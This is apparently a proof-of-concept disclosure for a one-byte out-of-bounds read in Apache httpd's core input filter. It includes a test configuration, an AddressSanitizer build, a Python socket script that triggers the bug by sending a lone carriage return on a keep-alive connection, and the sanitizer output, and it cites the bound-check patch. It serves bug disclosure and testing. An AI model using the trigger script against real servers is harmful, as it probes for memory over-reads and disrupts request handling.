# PoC 130 - One-byte OOB read in ap_core_input_filter EATCRLF scan

In `AP_MODE_EATCRLF`, `ap_core_input_filter()` evaluates `*(c + 1)` when the
last byte of a bucket is `\r`, dereferencing one byte past the buffer
returned by `apr_bucket_read()`.

## Setup

Stock httpd 2.4.66. The bug is in core filtering, so any vhost will do. We
run the build under an allocator that pads buffers with poisoned bytes so
the OOB read is observable.

`conf/httpd.conf`:

```
ServerName localhost
Listen 127.0.0.1:8080
LoadModule mpm_prefork_module  modules/mod_mpm_prefork.so
LoadModule authz_core_module   modules/mod_authz_core.so
LoadModule unixd_module        modules/mod_unixd.so
LoadModule log_config_module   modules/mod_log_config.so
LoadModule mime_module         modules/mod_mime.so

ErrorLog logs/error_log
LogLevel core:trace7
KeepAlive On
KeepAliveTimeout 30
MaxKeepAliveRequests 100
DocumentRoot "/tmp/htdocs"
<Directory "/tmp/htdocs">
    Require all granted
</Directory>
```

Build httpd with `-fsanitize=address` (or run under `valgrind`):

```
CFLAGS="-fsanitize=address -O0 -g" LDFLAGS="-fsanitize=address" \
    ./configure --with-mpm=prefork && make
```

ASAN catches the over-read because APR's pool buckets allocate from
sanitised pages.

## Trigger

We need a bucket whose last byte is `\r`, with no `\n` queued in the same
read. The driver opens a keep-alive connection, sends a complete request,
then writes a single trailing `\r` and pauses long enough for that byte to
become its own bucket boundary on the next read.

```
python3 - <<'PY'
import socket, time
s = socket.create_connection(("127.0.0.1", 8080))
req = b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"
s.sendall(req)
# Drain first response
while b"\r\n\r\n" not in s.recv(4096):
    pass
time.sleep(0.05)
# Send only a CR; let the kernel deliver it as a single-byte read.
s.sendall(b"\r")
time.sleep(0.5)
# Then a normal request to reuse the same connection.
s.sendall(b"GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n")
print(s.recv(4096))
PY
```

## Observed effect

When the lone `\r` arrives in its own socket bucket, `ap_core_input_filter()`
runs in `AP_MODE_EATCRLF` between requests, sets `c = str + 0`, and evaluates:

```
*c == APR_ASCII_CR && *(c + 1) == APR_ASCII_LF
```

`c + 1` is one byte past `str + len`. Under ASan:

```
==pid==ERROR: AddressSanitizer: heap-buffer-overflow
READ of size 1 at 0x... thread T0
    #0 0x... in ap_core_input_filter server/core_filters.c:185
```

Without ASan, the byte read is whatever follows the bucket's heap allocation:
sometimes `\n`, sometimes garbage. When the trailing byte happens to be
`\n`, the filter incorrectly consumes 2 bytes (advancing past memory that
was never delivered by the client), measurably skewing subsequent
keep-alive request framing on noisy traffic.

The patch's bound check (`c + 1 < str + len`) eliminates both the OOB read
and the resulting framing skew.
